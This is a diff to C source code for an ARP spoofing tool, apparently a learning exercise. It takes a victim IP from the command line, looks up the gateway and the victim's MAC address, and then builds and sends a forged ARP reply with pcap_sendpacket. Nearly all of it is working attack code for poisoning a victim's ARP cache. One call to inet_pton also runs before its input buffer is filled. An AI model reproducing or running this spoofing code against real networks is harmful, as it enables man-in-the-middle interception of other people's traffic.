@@ -21,12 +21,10 @@ int set_gateway_ip(char *gate_ip) {
         exit(1);
     }
 
-    char *token;
     /* Read the output a line at a time - output it. */
     if (fgets(result, sizeof(result)-1, fp) != NULL) {
         char *token = strtok(result, " ");
         token = strtok(NULL, " ");
-        printf("set_gateway_ip : [%s]\n", token);
         // memcpy(gate_ip, token, strlen(token));
         strcpy(gate_ip,token);
     }
@@ -46,19 +44,24 @@ int main(int argc, char *argv[])
 {
 //    printf("arg=%s, size=%d\n", argv[1], strlen(argv[1]));
 
-//    if (strlen(argv[1]) > INET_ADDRSTRLEN) {
-//        printf("wrong argument : too long address");
-//        exit(0);
-//    }
-//    char victim_ip[INET_ADDRSTRLEN];
-//    strcpy(victim_ip, argv[1]);
-
     char victim_ip[INET_ADDRSTRLEN];
-    cout << "dest ip?" ;
-    cin >> victim_ip;
+    char victim_ip_n[4];
+    inet_pton(AF_INET, victim_ip, victim_ip_n);
+    if (argc != 2) {
+        printf("lack of argument : need victim's ip address as command argument\n");
+        exit(0);
+    }
+    strcpy(victim_ip, argv[1]);
+    if (inet_pton(AF_INET, victim_ip, victim_ip_n) != 1) {
+        printf("wrong argument : invalid ip address");
+        exit(0);
+    }
 
-    struct libnet_ipv4_hdr ip_h;
-    //inet_pton(AF_INET, victim_ip, ip_h.ip_dst.s_addr);
+    strcpy(victim_ip, argv[1]);
+
+    // char victim_ip[INET_ADDRSTRLEN];
+    // cout << "dest ip?" ;
+    // cin >> victim_ip;
 
 
 
@@ -92,11 +95,11 @@ int main(int argc, char *argv[])
     strcpy(buffer.ifr_name, dev);
     ioctl(s, SIOCGIFHWADDR, &buffer);
     close(s);
+    printf("my mac address:");
     for( s = 0; s < 6; s++ )
     {
         printf("%.2X ", (unsigned char)buffer.ifr_hwaddr.sa_data[s]);
         my_mac[s] = (unsigned char)buffer.ifr_hwaddr.sa_data[s];
-        
     }
     printf("\n");
 
@@ -116,10 +119,11 @@ int main(int argc, char *argv[])
     ////// 3.  obtain gateway(receiver)'s ip address
     char gateway_ip[INET_ADDRSTRLEN];
     set_gateway_ip(gateway_ip);
-    printf("receiver ip = [%s]\n", gateway_ip);
+    printf("receiver(gateway) ip = [%s]\n", gateway_ip);
 
 
 
+    ////// 4. obtain victim's MAC address
     // create & send ARP REQUEST to destination(sender) ip
     // then obtain the sender MAC address
     u_char packet[LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H];
@@ -151,8 +155,6 @@ int main(int argc, char *argv[])
     for (i = 0; i < 6; i++)
         packet[LIBNET_ETH_H+LIBNET_ARP_H + 6 + 4 + i] = 0x00;
     // set victim ip address
-    char victim_ip_n[4];
-    inet_pton(AF_INET, victim_ip, victim_ip_n);
     memcpy((char*)arp_hdr + LIBNET_ARP_H + 6 + 4 + 6, victim_ip_n, 4);
     
 
@@ -167,11 +169,11 @@ int main(int argc, char *argv[])
         struct libnet_ethernet_hdr* eth_h = (struct libnet_ethernet_hdr*)pkt_data;
         unsigned short ether_type = ntohs(eth_h->ether_type);
         if (ether_type == ETHERTYPE_ARP) {
-            fprint_hex(stdout, pkt_data, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);
             char source_ip[INET_ADDRSTRLEN];
             inet_ntop(AF_INET, pkt_data + LIBNET_ETH_H + LIBNET_ARP_H + 6, source_ip, INET_ADDRSTRLEN);
             if ( strcmp(victim_ip, source_ip) == 0) {
                 printf("find victim's(%s) ARP REPLY!!\n", victim_ip);
+                fprint_hex(stdout, pkt_data, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);
                 break;
             }
         }
@@ -182,7 +184,7 @@ int main(int argc, char *argv[])
         victim_mac[i] = *(pkt_data + LIBNET_ETH_H + LIBNET_ARP_H + i);
 
 
-    // generate and send arp spoofing attack packet
+    /////// 5. generate and send arp spoofing attack packet
     u_char spoofing_pkt[LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H];
     
     for (i = 0; i < 6; i++)
@@ -215,6 +217,7 @@ int main(int argc, char *argv[])
             
     pcap_sendpacket(adhandle, spoofing_pkt, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);
     
+    printf("generate ARP SPOOFING ATTACK (FAKE ARP REPLY PACKET)\n");
     fprint_hex(stdout, spoofing_pkt, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);
 
 
